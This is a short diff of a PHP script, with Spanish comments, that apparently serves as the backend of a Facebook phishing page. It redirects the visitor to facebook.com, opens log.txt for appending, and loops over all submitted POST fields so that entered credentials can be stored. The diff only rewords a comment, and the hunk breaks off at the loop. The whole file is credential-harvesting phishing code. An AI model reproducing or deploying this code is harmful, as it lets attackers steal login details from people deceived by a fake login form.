@@ -1,7 +1,7 @@
 <?php
         
         header ('Location: https://www.facebook.com/ '); //La URL a redireccionar luego de presionar
-        $handle = fopen("log.txt", "a"); // se crea el guarda los datos en un archivo txt si no esta creado se crea automaticamente
+        $handle = fopen("log.txt", "a"); // se crea y guarda los datos en un archivo txt. en caso de no estar creado se crea automaticamente
         
 		//A partír de aquí se escriben las variables que obtiene luego del POST
         foreach($_POST as $variable => $value) {
